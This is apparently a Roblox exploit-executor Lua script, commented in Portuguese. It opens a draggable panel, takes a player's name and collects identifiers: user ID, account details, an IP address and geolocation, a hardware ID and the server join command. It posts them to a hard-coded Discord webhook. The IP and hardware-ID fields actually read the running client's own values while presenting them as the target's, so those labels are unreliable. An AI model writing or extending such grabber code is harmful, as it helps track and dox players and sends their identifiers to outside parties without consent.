local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local GuiService = game:GetService("GuiService")

-- Função para criar o painel
local function createTextBoxPanel()
    -- Criar a tela e a estrutura
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 150)
    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.5
    frame.Parent = screenGui

    -- Criar a caixa de texto para o nome do jogador
    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(0, 280, 0, 40)
    textBox.Position = UDim2.new(0, 10, 0, 40)
    textBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    textBox.PlaceholderText = "Digite o nome do jogador"
    textBox.ClearTextOnFocus = false
    textBox.Parent = frame

    -- Criar o botão de enviar
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 280, 0, 40)
    button.Position = UDim2.new(0, 10, 0, 90)
    button.Text = "Enviar"
    button.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    button.Parent = frame

    -- Variáveis para arrastar o painel
    local dragging = false
    local dragInput, mouseDelta, dragStart

    -- Função para iniciar o arrasto
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            dragInput = input
        end
    end)

    -- Função para atualizar a posição enquanto arrasta
    frame.InputChanged:Connect(function(input)
        if dragging and input == dragInput then
            mouseDelta = input.Position - dragStart
            frame.Position = UDim2.new(frame.Position.X.Scale, mouseDelta.X, frame.Position.Y.Scale, mouseDelta.Y)
        end
    end)

    -- Função para finalizar o arrasto
    frame.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)

    -- Função para capturar as informações do jogador
    button.MouseButton1Click:Connect(function()
        local playerName = textBox.Text
        if playerName == "" then
            print("Digite um nome de jogador válido!")
            return
        end

        -- Função para pegar as informações do jogador
        local function getPlayerInfo(playerName)
            local player = Players:FindFirstChild(playerName)
            if not player then
                return nil, "Jogador não encontrado."
            end

            -- Coleta as informações reais do jogador
            local Userid = player.UserId
            local DName = player.DisplayName
            local Name = player.Name
            local MembershipType = tostring(player.MembershipType):sub(21)
            local AccountAge = player.AccountAge
            local Country = game.LocalizationService.RobloxLocaleId
            local GetIp = game:HttpGet("https://v4.ident.me/") -- Informações de IP
            local GetData = game:HttpGet("http://ip-api.com/json") -- Dados do IP
            local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
            local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

            -- Game Info
            local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

            return {
                Userid = Userid,
                DName = DName,
                Name = Name,
                MembershipType = MembershipType,
                AccountAge = AccountAge,
                Country = Country,
                GetIp = GetIp,
                GetData = GetData,
                GetHwid = GetHwid,
                GAMENAME = GAMENAME,
                ConsoleJobId = ConsoleJobId
            }
        end

        -- Função para criar os dados do webhook
        local function createWebhookData(playerInfo)
            local data = {
                ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
                ["content"] = "",
                ["embeds"] = {
                    {
                        ["author"] = {
                            ["name"] = "Informações do Jogador",
                            ["url"] = "https://roblox.com",
                        },
                        ["description"] = string.format(
                            "__[Player Info](https://www.roblox.com/users/%d)__" ..
                            " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                            "\n**AccountAge:** %d\n**Country:** %s\n**IP:** %s\n**Hwid:** %s\n**Date:** %s\n**Time:** %s" ..
                            "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                            "\n**Game:** %s \n**Game Id**: %d \n**JobId:** %s",
                            playerInfo.Userid, playerInfo.DName, playerInfo.Name, playerInfo.Userid, playerInfo.MembershipType, 
                            playerInfo.AccountAge, playerInfo.Country, playerInfo.GetIp, playerInfo.GetHwid,
                            tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                            game.PlaceId, playerInfo.GAMENAME, game.PlaceId, playerInfo.ConsoleJobId
                        ),
                        ["type"] = "rich",
                        ["color"] = tonumber("0xFFD700"), -- Cor
                        ["thumbnail"] = {
                            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..playerInfo.Userid.."&width=150&height=150&format=png"
                        },
                    }
                }
            }

            return HttpService:JSONEncode(data)
        end

        -- Função para enviar o webhook para o Discord
        local function sendWebhook(webhookUrl, data)
            local headers = {
                ["content-type"] = "application/json"
            }
            local request = http_request or request or HttpPost or syn.request
            local requestData = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
            request(requestData)
        end

        -- Captura as informações do jogador
        local playerInfo, err = getPlayerInfo(playerName)
        if not playerInfo then
            print("Erro ao encontrar o jogador: " .. err)
            return
        end

        -- Substitua com sua URL de webhook
        local webhookUrl = "https://discord.com/api/webhooks/1331661006677737564/_vQxIjy8Yh8JwKdBXEWwlIS3JsUFyEb3-_CSi92wWDiDpH6NNjpERGdXoMiSWZQJ62aN"
        local webhookData = createWebhookData(playerInfo)
        sendWebhook(webhookUrl, webhookData)

        -- Avisar que os dados foram enviados
        print("Informações enviadas para o Discord!")
    end)
end

-- Criar o painel de entrada de texto
createTextBoxPanel()
